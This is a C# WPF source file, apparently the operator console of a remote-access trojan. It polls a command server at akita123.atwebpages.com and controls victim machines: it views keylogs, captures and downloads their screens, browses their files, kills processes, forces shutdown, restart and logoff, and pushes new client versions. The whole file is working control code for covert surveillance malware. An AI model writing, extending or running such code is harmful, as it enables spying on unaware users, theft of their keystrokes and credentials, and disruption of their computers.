﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Threading;

namespace Control
{
    /// <summary>
    /// Window1.xaml の相互作用ロジック
    /// </summary>
    public partial class MainWindow : Window
    {
        int userID = 1;
        int sessionID;
        int touserid;
        int selectedUser;
        int sendToAll = -1;

        ChatWindow chatWindow;
        FileExplorerWindow fileExplorerWindow;
        ProcessManagerWindow processManagerWindow;

        List<User> lstUser;

        delegate void _Action();

        public MainWindow()
        {
            InitializeComponent();

            chatWindow = new ChatWindow((mess) =>
            {
                Tools.sendCommand("mess " + mess, touserid, sendToAll);
            },
            () => { Tools.sendCommand("CLOSECHATBOX", touserid); });

            refreshListUser();

            grbOperation.IsEnabled = false;

            Thread thread = new Thread(requestCommand);
            thread.IsBackground = true;
            thread.Start();
        }

        private bool lstMainUserFilter(object item)
        {
            if (ckbShowOffline.IsChecked == false)
            {
                User user = item as User;
                if (user.status.ToUpper() == "ONLINE") return true; else return false;
            }

            return true;
        }
        private void timer_Tick(object sender, EventArgs e)
        {
            string[] cmds = getCommand();

            foreach (string cmd in cmds)
            {
                if (cmd != null && cmd != "")
                {
                    cmdProc(cmd);
                }
            }
        }

        private void requestCommand()
        {
            while (true)
            {
                string[] cmds = getCommand();

                foreach (string cmd in cmds)
                {
                    if (cmd != null && cmd != "")
                    {
                        cmdProc(cmd);
                    }
                }

                Thread.Sleep(1000);
            }
        }

        private void cmdProc(string cmd)
        {
            if (cmd.ToUpper().StartsWith("MESS"))
            {
                chatWindow.addMessage(lstUser[selectedUser].name, cmd.Substring(5));
            }
            else if (cmd.ToUpper().StartsWith("FILEEXPLORER"))
            {
                if (fileExplorerWindow != null) fileExplorerWindow.update(cmd.Substring(13).Replace(';', '\\'));

            }
            else if (cmd.ToUpper().StartsWith("MBOX"))
            {
                MessageBox.Show(cmd.Substring(5));
            }
            else if (cmd.ToUpper().StartsWith("VIEWSCREEN"))
            {
                new Thread(() =>
                {
                    using (var client = new WebClient())
                    {
                        client.DownloadFile("http://akita123.atwebpages.com/folder/ab.rar", "ab.jpg");
                        System.Diagnostics.Process.Start("ab.jpg");


                        _Action xt = () => { prbViewScreen.IsIndeterminate = false; };
                        prbViewScreen.Dispatcher.Invoke(DispatcherPriority.Normal, xt);


                    }
                }).Start();
            }
            else if (cmd.ToUpper().StartsWith("ONLINE"))
            {
                int id = int.Parse(cmd.Substring(7));
                setOnline(id);
            }
            else if (cmd.ToUpper().StartsWith("PROCESS"))
            {
                if (processManagerWindow != null)
                {
                    processManagerWindow.setdata(cmd.Substring(8));
                }
            }
        }

        private void setOnline(int userid)
        {
            foreach (User user in lstUser)
            {
                if (user.id == userid)
                {
                    user.status = "Online";


                    lstMainUser.Dispatcher.Invoke(new _Action(() =>
                    {
                        lstMainUser.Items.Refresh();
                        CollectionViewSource.GetDefaultView(lstMainUser.ItemsSource).Refresh();
                    }));

                    return;
                }
            }
        }

        private string[] getCommand()
        {
            string responseFromServer = Tools.request("http://akita123.atwebpages.com/main.php?type=3&ssid=0&touserid=" + userID);

            string[] sep = { "</br>" };

            return responseFromServer.Split(sep, StringSplitOptions.None);
        }

        private int getSessionID(int touserid)
        {
            //string url = "http://akita123.atwebpages.com/main.php?type=4&userid=" + touserid;
            //return int.Parse(Tools.request(url));
            return 0;
        }

        //private void refreshSessionID(int touserid)
        //{
        //    sessionID = getSessionID(touserid);

        //    txtSessionID.Text = "SessionID: " + sessionID;
        //}

        private void refreshListUser()
        {
            lstUser = Tools.getListUser();

            lstMainUser.ItemsSource = lstUser;
            CollectionView view = (CollectionView)CollectionViewSource.GetDefaultView(lstMainUser.ItemsSource);
            view.Filter = lstMainUserFilter;

            foreach (User user in lstUser)
            {
                Tools.sendCommand("ONLINE", user.id);
            }

            if (selectedUser > lstMainUser.SelectedIndex)
            {
                selectedUser = lstMainUser.SelectedIndex;
            }

            if (lstMainUser.Items.Count > 0)
            {
                lstMainUser.SelectedIndex = selectedUser;
            }
        }

        private void btnRefreshListUser_Click(object sender, RoutedEventArgs e)
        {
            refreshListUser();
        }

        //private void btnRefreshSSID_Click(object sender, RoutedEventArgs e)
        //{
        //    refreshSessionID(touserid);
        //}

        private void btnChat_Click(object sender, RoutedEventArgs e)
        {
            if (chatWindow != null)
            {
                chatWindow.Show();
                //chatWindow.setTouserid(touserid);
            }
        }

        private void btnShutdown_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("shutdown", touserid, sendToAll);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            chatWindow.Close();
            Tools.sendCommand("CLOSECHATBOX", touserid);
            Environment.Exit(0);
        }

        private void btnViewKeyLog_Click(object sender, RoutedEventArgs e)
        {
            ViewKeyLogWindow viewKeyLogWindow = new ViewKeyLogWindow(touserid, sessionID);
            viewKeyLogWindow.Show();
        }

        private void btnFileExplorer_Click(object sender, RoutedEventArgs e)
        {
            fileExplorerWindow = new FileExplorerWindow(touserid, sessionID);
            fileExplorerWindow.Show();
        }

        private void btnViewScreen_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("viewscreen", touserid);
            prbViewScreen.IsIndeterminate = true;
        }

        private void btnRestart_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("restart", touserid, sendToAll);
        }

        private void btnLogoff_Click(object sender, RoutedEventArgs e)
        {
            Tools.sendCommand("logoff", touserid, sendToAll);
        }

        private void btnUserManager_Click(object sender, RoutedEventArgs e)
        {
            UserManagerWindow userManagerWindow = new UserManagerWindow();
            userManagerWindow.Show();
        }

        private void lstMainUser_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (lstMainUser.SelectedItem != null)
            {
                selectedUser = lstUser.IndexOf(lstMainUser.SelectedItem as User);
                touserid = lstUser[selectedUser].id;
                lblUserName.Text = "Username: " + lstUser[selectedUser].name;
                //refreshSessionID(touserid);

                if (lstUser[selectedUser].status.ToUpper() == "ONLINE")
                {
                    grbOperation.IsEnabled = true;
                }
                else
                {
                    grbOperation.IsEnabled = false;
                }
            }
            else
            {
                grbOperation.IsEnabled = false;
            }
        }

        private void ckbShowOffline_Click(object sender, RoutedEventArgs e)
        {
            if (lstMainUser != null && lstMainUser.ItemsSource != null)
            {
                CollectionViewSource.GetDefaultView(lstMainUser.ItemsSource).Refresh();
            }
        }

        private void ckbSendThisSession_Checked(object sender, RoutedEventArgs e)
        {

        }

        private void ckbSendThisSession_Click(object sender, RoutedEventArgs e)
        {
            if (ckbSendThisSession.IsChecked == true)
            {
                sendToAll = -1;
            }
            else
            {
                sendToAll = 0;
            }
        }

        private void btnViewProcess_Click(object sender, RoutedEventArgs e)
        {
            processManagerWindow = new ProcessManagerWindow(() =>
            {
                Tools.sendCommand("PROCESS", touserid);
            },
            (processname) =>
            {
                Tools.sendCommand("KILLPROCESS " + processname, touserid);
            });

            processManagerWindow.Show();
        }

        private void btnUploadNewVersion_Click(object sender, RoutedEventArgs e)
        {
            UploadNewVersionWindow uploadNewVersion = new UploadNewVersionWindow();
            uploadNewVersion.Show();
        }
    }
}
